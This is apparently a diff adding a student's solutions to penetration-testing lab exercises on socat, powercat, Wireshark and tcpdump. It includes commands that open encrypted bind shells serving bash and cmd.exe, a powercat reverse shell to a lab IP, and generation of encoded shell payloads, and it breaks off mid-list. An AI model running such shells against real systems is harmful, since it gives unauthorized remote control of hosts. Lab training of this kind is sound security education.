@@ -1,0 +1,38 @@
+= Solutions to exercises from Chapter 4: Practical Tools
+
+== 4.2.4.1
+
+1. `socat TCP4-LISTEN:4444,fork file:/usr/share/powercat/powercat.ps1`
+2. `openssl req -newkey rsa:2048 -nodes -keyout output.key -x509 -days 365  -out output.crt && \
+    cat output.key output.crt > output.pem && \
+    socat OPENSSL-LISTEN:443,cert=output.pem,verify=0,fork EXEC:/bin/bash`
+3. `socat OPENSSL-LISTEN:443,cert-output.pem,verify=0,fork EXEC:cmd.exe,pipes` creates an encrypted bind shell from Windows
+4. Running unencrypted seems to be detected and blocked by Windows firewall
+
+== 4.3.8.1
+
+1. `powercat -c 192.168.119.224 -p 443 -e cmd.exe`
+2. `powercat -l  -p 443 -e cmd.exe`. Yes, it is possible to connect locally, as long as port 443 is used
+3. `powercat -l -p 443 -e cmd.exe -ge > encodedbindshell.ps1` for bind shell
+   `powercat -c 192.168.119.224 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1` for reverse shell
+
+== 4.4.5.1
+
+1. To capture activity, we use filter `host 10.11.1.217 and port 110`
+2. The three-way handshake is happening over TCP.
+3. Login attempt from Wireshark TCP stream looks like
+```
++OK example.com Cyrus POP3 v2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 server ready <1257769200.1596467546@example.com>
+login
+-ERR Unrecognized command
+user anonymous
++OK Name is a valid mailbox
+```
+4. Display filter is `tcp.port == 110`
+5. Capture filter is `port 110`
+
+== 4.5.3.1
+
+1. `tcpdump -n -i tun0` to listen to traffic on the VPN tunnel
+2. `tcpdump -n -i tun0 -X` shows the content of each packet
+3.
